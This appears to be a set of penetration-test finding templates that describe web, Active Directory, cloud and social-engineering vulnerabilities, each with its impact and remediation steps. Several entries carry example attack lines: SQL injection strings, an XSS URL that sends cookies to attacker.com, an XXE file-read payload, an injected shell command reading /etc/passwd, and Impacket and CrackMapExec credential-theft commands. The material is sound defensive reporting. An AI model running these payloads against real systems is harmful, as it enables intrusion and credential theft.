title: SQL Injection — Authentication Bypass
description:
SQL Injection vulnerabilities occur when user-supplied input is incorporated into SQL queries without proper sanitization or parameterization. An attacker can manipulate SQL queries to bypass authentication, extract data, modify records, or execute system commands.

Example payload: `' OR '1'='1' --`
impact: An attacker can bypass authentication controls entirely, gaining unauthorized access to the application. Further exploitation can lead to full database compromise, extraction of credentials, PII, and sensitive business data, modification or deletion of data, and in some configurations remote code execution via xp_cmdshell or file write operations.
remediation:
1. Use parameterized queries (prepared statements) for all database interactions.
2. Apply input validation and whitelist allowable characters.
3. Implement least-privilege database accounts.
4. Use an ORM to abstract database interactions.
5. Enable Web Application Firewall (WAF) rules for SQL injection patterns.

title: SQL Injection — Union-Based Data Extraction
description:
Union-based SQL injection allows an attacker to append additional SELECT statements to the original query, extracting data from other tables in the database. This technique requires the original query to return results visible in the application response.

Example: `' UNION SELECT username,password FROM users --`
impact: Direct extraction of all data from the database including user credentials, PII, financial records, and application secrets. In multi-tenant applications, cross-tenant data exposure is possible.
remediation:
1. Use parameterized queries for all database interactions.
2. Disable detailed SQL error messages in production.
3. Implement proper output encoding.
4. Apply principle of least privilege to database accounts.

title: SQL Injection — Blind (Boolean/Time-Based)
description: Blind SQL injection occurs where the application does not return query results or error details to the attacker. The attacker infers information by observing application behavior differences (boolean-based) or by introducing time delays (time-based) via functions like `SLEEP()` or `WAITFOR DELAY`.
impact: Although slower, blind SQLi still allows complete database enumeration. Automated tools like sqlmap can extract an entire database schema and data within hours.
remediation: Same as standard SQL Injection. Parameterized queries eliminate both error-based and blind injection vectors.

title: Cross-Site Scripting (XSS) — Reflected
description:
Reflected XSS occurs when user-supplied input is immediately returned by the server in an HTTP response without proper sanitization. The malicious script is not stored; it is delivered via a crafted URL or form submission and executed in the victim's browser when they visit the malicious link.

Example: `https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
impact: Session hijacking via cookie theft, credential harvesting via fake login overlays, forced actions on behalf of authenticated users, defacement of application pages in the victim's browser.
remediation:
1. Encode all user-supplied output using context-appropriate encoding (HTML, JavaScript, URL, CSS).
2. Implement a strict Content Security Policy (CSP).
3. Set the HttpOnly flag on session cookies.
4. Use modern frameworks that auto-escape output by default.

title: Cross-Site Scripting (XSS) — Stored
description: Stored XSS (also called Persistent XSS) occurs when malicious input is stored in the application's database or file system and later rendered to other users without sanitization. Every user who views the affected page executes the attacker's script.
impact: Mass session hijacking affecting all users who view the compromised page, account takeover at scale, worm-like propagation in social features, admin account compromise if admins view affected content.
remediation:
1. Sanitize all user input before storing.
2. Encode all stored data on output using context-aware encoding.
3. Implement CSP headers.
4. Consider HTML sanitization libraries (DOMPurify) for rich text inputs.

title: Cross-Site Scripting (XSS) — DOM-Based
description: DOM-based XSS occurs entirely client-side when JavaScript reads attacker-controlled data from the DOM (e.g., `location.hash`, `document.referrer`) and writes it to a dangerous sink (e.g., `innerHTML`, `eval()`). The server never sees the payload.
impact: Same impact as reflected XSS — session hijacking, credential theft, forced user actions. Harder to detect via server-side WAF since the payload never reaches the server.
remediation:
1. Audit all JavaScript for dangerous sinks (`innerHTML`, `eval`, `document.write`).
2. Use safe DOM APIs (`textContent`, `createElement`).
3. Implement strict CSP.
4. Use DOMPurify when HTML rendering from user data is necessary.

title: Insecure Direct Object Reference (IDOR)
description:
IDOR occurs when the application uses user-controllable input to access objects directly without verifying authorization. Changing a parameter value (e.g., `?user_id=1234` to `?user_id=1235`) accesses another user's resources.

Common locations: API endpoints, file download parameters, order IDs, invoice numbers.
impact: Unauthorized access to other users' data including personal information, financial records, medical data, or private files. Can affect all users in the application.
remediation:
1. Implement server-side authorization checks on every object access request.
2. Use indirect object references (e.g., map UUIDs to actual IDs server-side).
3. Validate that the authenticated user has permission to access the requested object.
4. Audit all API endpoints for missing authorization checks.

title: Broken Access Control
description:
Broken access control encompasses failures in enforcing authorization policies. Users can act outside their intended permissions — accessing admin functions, viewing other users' data, or modifying access controls.

Common examples: Accessing `/admin` endpoint without admin role, modifying another user's account by changing the user ID in a request, privilege escalation via role parameter manipulation.
impact: Unauthorized access to administrative functions, horizontal privilege escalation across user accounts, vertical privilege escalation to admin roles, unauthorized modification or deletion of data.
remediation:
1. Implement access control at the server side — never rely on client-side enforcement.
2. Deny access by default; require explicit grants.
3. Log all access control failures and alert on repeated failures.
4. Implement thorough authorization tests in CI/CD pipeline.

title: XML External Entity (XXE) Injection
description:
XXE occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Attackers can use this to read arbitrary files from the server, perform SSRF, and in some cases achieve remote code execution.

Example payload:
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>```
impact: Reading sensitive files from the server (e.g., `/etc/passwd`, application configs, private keys), SSRF to internal services, denial of service via billion laughs attack.
remediation:
1. Disable XML external entity and DTD processing in all XML parsers.
2. Use less complex data formats like JSON where possible.
3. Patch or upgrade all XML processing libraries.
4. Implement input validation and whitelisting.

title: Server-Side Request Forgery (SSRF)
description:
SSRF vulnerabilities allow an attacker to induce the server-side application to make HTTP requests to an arbitrary domain or IP of the attacker's choosing. This can be used to reach internal services not accessible from the internet.

High-impact targets include: AWS EC2 metadata endpoint (169.254.169.254), Kubernetes API server, internal admin panels, Redis, Elasticsearch.
impact: Access to internal services behind firewalls, cloud metadata credential theft leading to full cloud account takeover, port scanning of internal network, authentication bypass for internal services.
remediation:
1. Validate and sanitize all user-supplied URLs.
2. Use an allowlist of permitted domains/IPs for outbound requests.
3. Block access to internal IP ranges (RFC1918, 169.254.0.0/16) at the network layer.
4. Disable HTTP redirects or validate redirect destinations.
5. On AWS, require IMDSv2 to mitigate metadata endpoint abuse.

title: OS Command Injection
description:
Command injection vulnerabilities occur when user-supplied data is passed to a system shell command without proper sanitization. Attackers can inject additional commands using shell metacharacters (`;`, `|`, `&&`, backticks).

Example: A ping functionality using `os.system('ping ' + user_input)` where `user_input` is `8.8.8.8; cat /etc/passwd`.
impact: Arbitrary operating system command execution as the web server user. Can lead to full server compromise, data exfiltration, installation of backdoors, lateral movement, and persistence.
remediation:
1. Avoid calling OS commands from application code where possible.
2. If OS commands are necessary, use safe APIs that do not invoke the shell (e.g., `execve()` instead of `system()`).
3. Validate and strictly whitelist all input passed to system commands.
4. Run the application with minimal OS privileges.

title: Path Traversal
description:
Path traversal (directory traversal) allows an attacker to access files outside the intended directory by manipulating file path parameters with sequences like `../`. Can be used to read sensitive server files.

Example: `GET /download?file=../../etc/passwd`
impact: Reading sensitive files including application configuration, credentials, SSH private keys, `/etc/shadow`, and source code.
remediation:
1. Validate and sanitize file path inputs — reject or strip `../` sequences.
2. Use a safe path joining function and verify the resolved path starts with the intended base directory.
3. Avoid passing user input to file system APIs.
4. Implement OS-level file permissions to limit readable files.

title: Insecure Deserialization
description:
Insecure deserialization flaws occur when an application deserializes data from an untrusted source without validation. Attackers can manipulate serialized objects to achieve remote code execution, privilege escalation, or bypass authentication.

Common vectors: Java serialized objects, Python pickle, PHP unserialize, JSON type confusion, YAML deserialization.
impact: Remote code execution, authentication bypass, privilege escalation, denial of service.
remediation:
1. Avoid deserializing data from untrusted sources.
2. Implement integrity checks (digital signatures) on serialized data.
3. Run deserialization in an isolated environment with minimal privileges.
4. Log deserialization failures and monitor for unusual patterns.
5. Use safe, type-explicit formats like JSON with strict schema validation.

title: Security Misconfiguration
description: Security misconfigurations are the most common finding across web applications. This includes: default credentials left in place, unnecessary services or features enabled, verbose error messages exposing stack traces, directory listing enabled, insecure default configurations, missing security headers.
impact: Exposure of sensitive application internals, potential initial access via default credentials, information disclosure aiding further attacks.
remediation:
1. Establish a repeatable hardening process and apply it to all environments.
2. Remove or disable unused features, components, and services.
3. Review and update security configurations regularly.
4. Automate misconfiguration scanning in CI/CD pipelines.

title: Sensitive Data Exposure in HTTP Responses
description: The application returns sensitive information in HTTP responses that should not be exposed, including internal IP addresses, software versions, stack traces, API keys, tokens, or personally identifiable information in error messages or response bodies.
impact: Information disclosure can reveal internal infrastructure details, aid in targeted exploitation, and expose credentials or PII directly.
remediation:
1. Configure custom error pages that do not reveal technical details.
2. Remove version headers (Server, X-Powered-By).
3. Audit all API responses for unintentional data exposure.
4. Implement data minimization principles in API responses.

title: Broken Authentication — Weak Session Management
description: The application has weaknesses in session management including: predictable session token values, tokens not invalidated on logout, overly long session timeouts, tokens transmitted over HTTP, tokens exposed in URLs, or tokens with insufficient entropy.
impact: Session hijacking, account takeover, impersonation of legitimate users.
remediation:
1. Use a cryptographically secure random session token generator (minimum 128 bits of entropy).
2. Invalidate session tokens immediately on logout and after authentication state changes.
3. Implement appropriate session timeouts.
4. Transmit tokens only over HTTPS.
5. Set Secure and HttpOnly flags on session cookies.

title: JWT — None Algorithm Accepted
description: The application's JWT implementation accepts tokens signed with the `alg: none` algorithm, meaning an unsigned token is accepted as valid. An attacker can modify the token payload (e.g., change their role to `admin`) and submit it with `alg: none` and an empty signature.
impact: Complete authentication bypass and privilege escalation to any role. An attacker can assume the identity of any user including administrators.
remediation:
1. Explicitly whitelist permitted algorithms in JWT validation — never accept `none`.
2. Use a well-maintained JWT library and keep it updated.
3. Use asymmetric signing (RS256, ES256) rather than symmetric (HS256) where possible.
4. Validate all JWT claims (iss, aud, exp) on every request.

title: CORS Misconfiguration — Arbitrary Origin Allowed
description: The application reflects the `Origin` request header in the `Access-Control-Allow-Origin` response header, or uses a wildcard (`*`) in combination with `Access-Control-Allow-Credentials: true`. This allows any malicious website to make credentialed cross-origin requests to the API and read responses.
impact: An attacker can host a malicious website that makes authenticated API requests on behalf of visiting users, stealing sensitive data from API responses.
remediation:
1. Maintain a whitelist of trusted origins and validate strictly against it.
2. Do not use wildcard (`*`) with `Access-Control-Allow-Credentials: true`.
3. Avoid dynamic reflection of Origin headers without validation.

title: Open Redirect
description:
The application uses user-supplied input to construct redirect URLs without validation. An attacker can craft URLs like `https://victim.com/login?next=https://attacker.com` that redirect users to malicious sites after interaction with the trusted domain.

Common use in phishing campaigns and OAuth token theft.
impact: Credential phishing by redirecting users after authentication to attacker-controlled pages. OAuth token theft by redirecting authorization codes to attacker URLs.
remediation:
1. Avoid using user-supplied input in redirect parameters.
2. If redirects are required, use an allowlist of permitted destination URLs.
3. Implement a redirect warning page for external URLs.
4. Reject absolute URLs in redirect parameters — accept only relative paths.

title: Host Header Injection
description: The application uses the HTTP `Host` header value in generated URLs (e.g., password reset links, email confirmation links) without validation. An attacker who can send a manipulated Host header can redirect these links to an attacker-controlled server.
impact: Password reset link hijacking (attacker intercepts reset tokens), cache poisoning, SSRF via Host header.
remediation:
1. Hardcode the application's domain in generated URLs rather than reading from the Host header.
2. Validate the Host header against a whitelist of permitted values.
3. Configure the web server to reject requests with unexpected Host headers.

title: Clickjacking — Missing X-Frame-Options
description: The application does not implement X-Frame-Options or Content-Security-Policy frame-ancestors directives, allowing it to be embedded in an iframe on a malicious website. An attacker can overlay invisible UI elements over the legitimate application to trick users into performing unintended actions.
impact: Tricking authenticated users into performing unintended actions (like changing account settings, making purchases, or changing passwords) without their knowledge.
remediation:
1. Add `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN` header.
2. Implement `Content-Security-Policy: frame-ancestors 'self'` header.
3. Use SameSite cookie attribute.

title: SMB Signing Disabled
description: SMB signing is disabled or not required on the target host, making it vulnerable to NTLM relay attacks. An attacker with network access (e.g., via Responder) can intercept SMB authentication attempts and relay them to target systems to gain unauthorized access without knowing the credentials.
impact: An attacker can relay captured NTLM authentication to access file shares, execute code remotely, and potentially achieve lateral movement across the network.
remediation:
1. Enable and require SMB signing on all Windows hosts via Group Policy.
2. Block NTLM authentication where possible and enforce Kerberos.
3. Enable Extended Protection for Authentication (EPA).
4. Deploy SMB signing enforcement via: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network server: Digitally sign communications (always): Enabled.

title: RDP Externally Exposed
description: Remote Desktop Protocol (port 3389) is directly accessible from the internet on the target host. RDP exposure increases the attack surface for brute-force attacks, credential stuffing, and exploitation of RDP vulnerabilities (e.g., BlueKeep CVE-2019-0708, DejaBlue CVE-2019-1181).
impact: Direct brute-force or credential stuffing attacks against the RDP service, exploitation of unpatched RDP vulnerabilities leading to unauthenticated remote code execution.
remediation:
1. Restrict RDP access using firewall rules — only permit from VPN or management IP ranges.
2. Implement Network Level Authentication (NLA).
3. Use a VPN or bastion host for remote access instead of direct RDP exposure.
4. Apply all Windows security patches.
5. Enable account lockout policies.

title: Default Credentials on Network Device
description: The target network device (router, switch, firewall, printer, or management interface) is accessible with default vendor credentials (e.g., admin/admin, admin/password, cisco/cisco). Default credentials are publicly documented and are the first thing automated scanners and attackers attempt.
impact: Complete compromise of the network device, configuration modification, traffic interception, creation of new admin accounts, and use as a pivot point into the internal network.
remediation:
1. Change all default credentials immediately upon device deployment.
2. Implement a password management policy for all network devices.
3. Maintain an inventory of all network devices and their access credentials.
4. Use network access control to limit management interface access.

title: DNS Zone Transfer Allowed
description:
The DNS server allows zone transfer requests (AXFR) from arbitrary clients. This allows an attacker to enumerate all DNS records in the zone, revealing hostnames, internal IP addresses, mail servers, and other infrastructure details.

Test command: `dig axfr @<nameserver> <domain>`
impact: Complete DNS zone enumeration revealing internal hostnames, IP ranges, mail server configuration, and infrastructure layout. Significantly aids in reconnaissance for further attacks.
remediation:
1. Restrict zone transfers to only authorized secondary DNS servers by IP.
2. Configure your DNS server to deny AXFR requests from untrusted sources.
3. Consider split-horizon DNS to limit external DNS exposure.

title: Anonymous FTP Access Enabled
description: The FTP server allows anonymous authentication. Any unauthenticated user can connect and may be able to read or write files depending on directory permissions. The FTP protocol also transmits credentials in cleartext.
impact: Unauthenticated access to files hosted on the FTP server. If write access is enabled, attackers can upload malicious files.
remediation:
1. Disable anonymous FTP access unless explicitly required.
2. Migrate to SFTP or FTPS for encrypted file transfer.
3. Restrict FTP access to specific IP ranges.
4. Implement file permission auditing.

title: SNMP Default Community String (public/private)
description: The target device uses the default SNMP community string `public` (read) or `private` (read-write). SNMP v1/v2c uses community strings as cleartext passwords. With the read community string, an attacker can enumerate the device configuration, interface details, routing tables, and ARP cache.
impact: With read access: full network configuration enumeration, discovery of other internal hosts, credential exposure. With write access (private): device configuration modification, potential takeover.
remediation:
1. Change all SNMP community strings to complex, non-default values.
2. Migrate to SNMPv3 which supports authentication and encryption.
3. Restrict SNMP access to specific management IP ranges.
4. Disable SNMP if not required.

title: Kerberoastable Service Accounts
description:
One or more service accounts have Service Principal Names (SPNs) registered and use weak passwords. Any authenticated domain user can request a Kerberos service ticket (TGS) for these accounts. The ticket is encrypted with the account's password hash and can be cracked offline without generating authentication failures.

Tool: `GetUserSPNs.py domain/user:pass -outputfile hashes.txt`
impact: Offline cracking of service account passwords. If the account has elevated privileges (e.g., local admin, domain admin), successful cracking leads to privilege escalation.
remediation:
1. Use strong (25+ character random) passwords for all service accounts.
2. Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA) which have auto-rotating 120-character passwords.
3. Audit and remove unnecessary SPNs.
4. Monitor for abnormal TGS requests (Event ID 4769).

title: AS-REP Roastable Accounts
description:
One or more Active Directory accounts have the `DONT_REQUIRE_PREAUTH` flag set, disabling Kerberos pre-authentication. An unauthenticated attacker can request AS-REP tickets for these accounts and crack them offline.

Tool: `GetNPUsers.py domain/ -no-pass -usersfile users.txt -outputfile hashes.txt`
impact: Offline cracking of user account passwords without any authentication required. If affected accounts have elevated privileges, this enables privilege escalation from an unauthenticated position.
remediation:
1. Require Kerberos pre-authentication for all accounts — disable `DONT_REQUIRE_PREAUTH`.
2. Ensure all user accounts have strong passwords.
3. Audit accounts with this flag set via PowerShell: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`.

title: NTLM Hash Capture via Responder
description: NTLM credential hashes were captured by exploiting LLMNR/NBT-NS/mDNS name resolution poisoning using Responder. When a host broadcasts name resolution queries, Responder responds and captures the NetNTLMv2 challenge-response hash, which can be cracked offline or relayed.
impact: Offline cracking of captured NTLM hashes using hashcat/john. If hashes cannot be cracked, they can be relayed to other hosts where SMB signing is disabled for direct authentication.
remediation:
1. Disable LLMNR via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution: Enabled.
2. Disable NBT-NS in network adapter settings or via DHCP option 001.
3. Enable SMB signing to prevent relay attacks.
4. Implement Network Access Control (NAC).

title: Pass-the-Hash Attack Successful
description:
A valid NTLM hash was used to authenticate to a remote system without knowing the plaintext password. Using the captured hash directly with tools like Mimikatz, CrackMapExec, or Impacket's psexec.py, authentication was achieved against the target.

Command: `crackmapexec smb <target> -u admin -H <hash>`
impact: Lateral movement across the network without cracking passwords. If the hash belongs to a domain admin, full domain compromise is achievable.
remediation:
1. Enable Protected Users security group for privileged accounts.
2. Implement Credential Guard to prevent NTLM hash dumping.
3. Disable NTLM authentication and enforce Kerberos where possible.
4. Implement Local Administrator Password Solution (LAPS) to randomize local admin passwords.

title: DCSync Privilege Achieved
description:
The compromised account has been granted DCSync rights (Replicating Directory Changes + Replicating Directory Changes All) on the domain. This allows replication of all domain password hashes using the Directory Replication Service (DRS) protocol without requiring a Domain Controller login.

Tool: `secretsdump.py domain/user:pass@dc_ip`
impact: Extraction of all domain user password hashes including the KRBTGT hash (enabling Golden Ticket attacks), Administrator hash, and all privileged account hashes. This represents complete domain compromise.
remediation:
1. Audit and remove DCSync permissions from all non-DC accounts.
2. Monitor for unusual directory replication traffic (Event ID 4662).
3. Restrict Active Directory replication permissions to Domain Controllers only.
4. Implement Privileged Access Workstations (PAW) for domain admin activities.

title: Unconstrained Delegation Configured
description: One or more domain computers or service accounts are configured with unconstrained Kerberos delegation. When any user authenticates to a service on this host, their TGT (Ticket Granting Ticket) is cached in memory. An attacker with admin access to the host can extract these TGTs and use them to impersonate any user who authenticated, including Domain Admins.
impact: If a Domain Admin authenticates to the compromised host (or is coerced to via printer bug/PetitPotam), their TGT can be extracted and used to fully compromise the domain.
remediation:
1. Replace unconstrained delegation with constrained or resource-based constrained delegation.
2. Enable 'Account is sensitive and cannot be delegated' on privileged accounts.
3. Add privileged accounts to the Protected Users security group.
4. Audit delegation settings: `Get-ADComputer -Filter {TrustedForDelegation -eq $true}`

title: BloodHound — Path to Domain Admin Exists
description: BloodHound analysis of the Active Directory environment reveals an attack path from a low-privileged user to Domain Admin. The path exploits a combination of group memberships, delegation configurations, ACL misconfigurations, or local admin rights across multiple hosts.
impact: A low-privileged user can elevate to Domain Admin through a chain of exploitable relationships. Domain Admin compromise results in complete control over all domain-joined systems.
remediation:
1. Analyze and remediate each step in the identified BloodHound attack path.
2. Implement tiered administration model separating workstations, servers, and domain controllers.
3. Audit and clean up unnecessary group memberships and ACL permissions.
4. Run BloodHound analysis regularly as part of security operations.

title: ZeroLogon (CVE-2020-1472)
description: The domain controller is vulnerable to CVE-2020-1472 (ZeroLogon), a critical vulnerability in the Netlogon Remote Protocol. By exploiting a cryptographic flaw, an unauthenticated attacker on the network can impersonate any computer including the domain controller, and set the computer's Active Directory password to empty, leading to full domain compromise.
impact: Complete domain compromise achievable from an unauthenticated position on the network. The DC's password can be reset to empty allowing an attacker to extract all domain hashes via DCSync.
remediation:
1. Apply Microsoft security update KB4565349 (August 2020 Patch Tuesday) immediately.
2. Enable enforcement mode in the August 2020 update.
3. Monitor for CVE-2020-1472 exploitation attempts (Event ID 5829).

title: PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
description: The target Windows system is vulnerable to PrintNightmare, a critical vulnerability in the Windows Print Spooler service. Authenticated domain users can exploit this vulnerability to load malicious DLLs through the printer driver installation path, resulting in privilege escalation to SYSTEM or remote code execution.
impact: Any authenticated domain user can escalate to SYSTEM on the target host. On domain controllers, this results in complete domain compromise.
remediation:
1. Apply Microsoft patches immediately (KB5004945 and subsequent cumulative updates).
2. Disable the Print Spooler service on servers that do not require printing, especially Domain Controllers.
3. If patching is not immediately possible, restrict Point and Print settings via Group Policy.

title: Password Spraying — Successful Authentication
description: Password spraying was used to identify accounts with weak or common passwords. Unlike brute-force attacks, password spraying tests a single password against many accounts to avoid lockout policies. Common passwords tested include: `Password1`, `Welcome1`, `Summer2024`, `Company_name1`.
impact: Compromise of user accounts, potential access to sensitive data, email, VPN, and cloud resources. Initial foothold for further internal network attacks.
remediation:
1. Implement a strong password policy (minimum 12 characters, complexity requirements).
2. Enable multi-factor authentication for all accounts, especially remote access.
3. Implement account lockout policies with appropriate thresholds.
4. Monitor for password spray patterns (many failed logins across different accounts).

title: Weak Active Directory Password Policy
description: The Active Directory domain password policy does not meet minimum security standards. Identified weaknesses include: minimum password length below 12 characters, no complexity requirements, excessive maximum password age, no account lockout policy, or lockout threshold set too high.
impact: Weak passwords are susceptible to brute-force, password spraying, and offline cracking. Poor lockout policies allow unlimited password guessing attempts.
remediation:
1. Set minimum password length to 14+ characters.
2. Enable password complexity requirements.
3. Set maximum password age to 90 days or less.
4. Implement account lockout (e.g., 5 attempts, 30-minute lockout).
5. Consider implementing Microsoft's password ban list and HIBP integration.

title: SYSVOL / Group Policy Preferences — Credentials Found
description:
Credentials were found stored in SYSVOL in Group Policy Preferences (GPP) files (Groups.xml, Services.xml, Scheduledtasks.xml, etc.). These files use AES-256 encryption but Microsoft published the decryption key publicly (MS14-025), allowing any authenticated user to decrypt them.

Tool: `Get-GPPPassword` (PowerSploit)
impact: Cleartext credentials for local administrator or service accounts, potentially reused across many hosts in the domain.
remediation:
1. Delete all GPP files containing `cpassword` attributes from SYSVOL.
2. Apply Microsoft patch MS14-025.
3. Change all passwords that were stored in GPP.
4. Search with: `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`

title: Amazon S3 Bucket — Public Read/Write
description:
An Amazon S3 bucket was found with public read or read/write access. Any unauthenticated user can list, read, and potentially write or delete objects in the bucket.

Test: `aws s3 ls s3://bucket-name --no-sign-request`
impact: Public read: exposure of all stored data including application files, backups, logs, credentials, PII, and intellectual property. Public write: ability to upload malicious content, tamper with application files, or perform web application attacks if bucket hosts static content.
remediation:
1. Disable public access via S3 Block Public Access settings.
2. Audit bucket ACLs and bucket policies.
3. Enable AWS S3 server-side encryption.
4. Enable CloudTrail S3 data events for access logging.
5. Use S3 Access Analyzer to detect unintended public access.

title: IAM Overpermissive Role — Administrator Policy Attached
description: An IAM user, role, or group has the `AdministratorAccess` managed policy attached or equivalent wildcard permissions (`Action: '*'`, `Resource: '*'`). This violates the principle of least privilege and means any compromise of this identity results in full AWS account takeover.
impact: Full AWS account compromise. Attacker can create backdoor accounts, exfiltrate all data, modify security controls, incur financial charges, and pivot to any connected accounts in the organization.
remediation:
1. Replace wildcard IAM policies with least-privilege policies scoped to required actions and resources.
2. Use AWS IAM Access Analyzer to identify overpermissive policies.
3. Implement IAM permission boundaries.
4. Review and revoke unused IAM credentials.
5. Enable AWS Organizations SCPs to restrict maximum permissions.

title: EC2 Instance Metadata Service v1 (IMDSv1) Enabled — SSRF Risk
description:
EC2 instances have IMDSv1 enabled, which does not require a session token for metadata access. If the application is vulnerable to SSRF, an attacker can send requests to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` to steal temporary AWS credentials.

This technique was used in the Capital One breach (2019).
impact: Theft of temporary IAM credentials attached to the EC2 instance role, leading to whatever level of AWS access the role has — potentially full account compromise.
remediation:
1. Require IMDSv2 on all EC2 instances: `aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required`.
2. Fix SSRF vulnerabilities in applications.
3. Use IMDSv2-only AMIs.
4. Apply least-privilege IAM roles to EC2 instances.

title: CloudTrail Logging Disabled
description: AWS CloudTrail is not enabled in the target AWS account or region, or has been disabled/tampered with. CloudTrail provides the audit log of all API calls made in AWS. Without it, there is no record of attacker activity, making detection and incident response extremely difficult.
impact: Complete loss of audit capability. Attacker activities including credential theft, privilege escalation, data exfiltration, and backdoor creation cannot be detected or reconstructed after an incident.
remediation:
1. Enable CloudTrail in all regions with multi-region trail.
2. Enable CloudTrail log file validation.
3. Store CloudTrail logs in a dedicated, access-controlled S3 bucket.
4. Set up CloudWatch alarms for CloudTrail configuration changes.
5. Consider enabling AWS Security Hub for centralized findings.

title: Security Group — Unrestricted Inbound Access (0.0.0.0/0)
description: AWS Security Groups have inbound rules permitting unrestricted access from `0.0.0.0/0` (all IPv4) or `::/0` (all IPv6) on sensitive ports including SSH (22), RDP (3389), database ports (3306, 5432, 1433), or all traffic. This exposes services directly to the internet.
impact: Direct internet exposure of critical services to brute-force, exploitation of known vulnerabilities, and unauthorized access.
remediation:
1. Restrict security group rules to the minimum required source IP ranges.
2. Replace 0.0.0.0/0 rules with VPN IP ranges or specific corporate IP addresses.
3. Use AWS Security Hub / Trusted Advisor to identify overly permissive security groups.
4. Implement VPC flow logs to monitor unexpected traffic.

title: Multi-Factor Authentication Not Enforced
description: The application does not enforce multi-factor authentication (MFA) for user authentication. Single-factor authentication (password only) leaves accounts vulnerable to password-based attacks including phishing, credential stuffing, password spraying, and data breach replay attacks.
impact: Account takeover via compromised credentials with no additional barrier. This is the most common initial access vector for cloud services and SaaS applications.
remediation:
1. Enforce MFA for all user accounts, especially privileged roles.
2. Use authenticator apps (TOTP) or hardware keys (FIDO2/WebAuthn) rather than SMS-based MFA.
3. Implement conditional access policies to require MFA for sensitive operations.
4. Block legacy authentication protocols that do not support MFA.

title: Account Enumeration via Login Response Differences
description: The application returns different error messages for valid vs. invalid usernames during login (e.g., 'User not found' vs 'Incorrect password') or exhibits timing differences that allow distinguishing between valid and invalid accounts. This enables account enumeration.
impact: Attacker can enumerate valid usernames to use in targeted credential attacks (brute-force, password spraying, phishing).
remediation:
1. Use generic error messages that do not reveal whether the username or password was incorrect.
2. Implement consistent response timing regardless of whether the account exists.
3. Implement rate limiting and CAPTCHA on authentication endpoints.

title: Insecure Password Reset — Token Predictable or Reusable
description: The password reset mechanism uses predictable token values (sequential IDs, timestamps, short tokens), tokens that do not expire, or tokens that can be used multiple times. An attacker can guess or brute-force reset tokens to hijack any account.
impact: Account takeover for any user account by exploiting the password reset mechanism without knowing the current password.
remediation:
1. Use cryptographically random tokens with at least 128 bits of entropy.
2. Expire reset tokens after a short period (15-30 minutes).
3. Invalidate the token immediately after first use.
4. Bind the token to the user's current IP address or email.
5. Rate-limit password reset requests.

title: Session Token Not Invalidated on Logout
description: When a user logs out, the server does not invalidate the session token. A captured token (from network interception, browser history, logs, or referrer headers) remains valid indefinitely and can be replayed to authenticate as the user after they have logged out.
impact: Session hijacking via token replay after the legitimate user has logged out. Particularly impactful in shared computer scenarios.
remediation:
1. Implement server-side session invalidation on logout (add token to a denylist or remove from the session store).
2. For JWT tokens, maintain a token revocation list or use short expiry times.
3. Clear all session cookies from the client on logout.

title: Phishing — Credential Capture
description: A phishing campaign targeting organization employees was successful in capturing credentials. A cloned login page was hosted on a lookalike domain. Emails were sent appearing to originate from IT department requesting users to verify their credentials. Captured credentials were validated against the production environment.
impact: Valid employee credentials captured. Depending on the role of compromised accounts, this may grant access to email, VPN, cloud services, or internal applications. MFA bypass was attempted using real-time proxying tools (e.g., Evilginx).
remediation:
1. Enforce phishing-resistant MFA (FIDO2/WebAuthn hardware keys).
2. Implement email security controls (DMARC, DKIM, SPF).
3. Deploy and tune anti-phishing email filtering.
4. Conduct regular phishing awareness training.
5. Implement Conditional Access policies to restrict authentication from unexpected locations.

title: Phishing — Malicious Attachment Execution
description: A phishing email with a malicious attachment (macro-enabled document, LNK file, or ISO containing executable) was delivered and executed by a user. The payload established a reverse shell or C2 beacon on the user's workstation.
impact: Initial foothold on an internal workstation. From this position lateral movement, credential harvesting, and data exfiltration are possible.
remediation:
1. Block macro execution in Office documents via Group Policy.
2. Enable Attack Surface Reduction (ASR) rules in Microsoft Defender.
3. Block execution of files from common phishing locations (Downloads, Temp, Outlook attachments).
4. Deploy email gateway scanning for malicious attachments.
5. Enable and tune endpoint detection and response (EDR) tooling.

title: Physical — Tailgating Successful
description: Physical security testing demonstrated that an unauthorized individual was able to follow an authorized employee through a secured door without using an access badge (tailgating). Testing demonstrated this was possible at multiple entry points during normal business hours.
impact: Unauthorized physical access to the facility enables plugging in rogue network devices, accessing unlocked workstations, theft of physical assets, and bypassing logical security controls.
remediation:
1. Train employees to challenge unknown individuals and prevent tailgating.
2. Install anti-tailgate mechanisms (mantrap vestibules) at high-security access points.
3. Ensure each individual badges in at secured doors.
4. Install and review CCTV coverage at all entry points.
5. Implement visitor management and escort policies.

title: Vishing — Sensitive Information Disclosed
description: A voice phishing (vishing) call was placed impersonating IT support or a vendor. The target employee disclosed sensitive information including system details, processes, or credentials after minimal pretexting, without verifying the caller's identity through established procedures.
impact: Disclosure of sensitive information that can be used to support technical attacks, including internal system names, processes, supplier details, or direct credential disclosure.
remediation:
1. Implement a call-back verification process for sensitive requests made by phone.
2. Train employees on social engineering tactics and the importance of identity verification.
3. Establish clear policies about what information can be shared over the phone.
4. Never disclose credentials over the phone.

title: GCP Service Account Key Exposed
description: A Google Cloud Platform service account key (JSON format) was discovered in a public repository, exposed application endpoint, or accessible storage location. Service account keys do not expire by default and provide persistent API access.
impact: Complete compromise of all GCP resources accessible to the service account. If the account has broad permissions (Editor/Owner), this represents a full GCP project takeover.
remediation:
1. Immediately revoke the exposed key in GCP Console → IAM & Admin → Service Accounts.
2. Rotate all credentials that may have been exposed alongside the key.
3. Prefer Workload Identity over service account key files.
4. If keys are necessary, use Secret Manager and restrict key permissions to minimum required.
5. Enable audit logging for service account key usage.

title: Azure Storage Account — Public Blob Access
description: An Azure Storage Account has blob public access enabled, allowing unauthenticated read access to stored blobs. Storage accounts are commonly used for backups, application data, and log files.
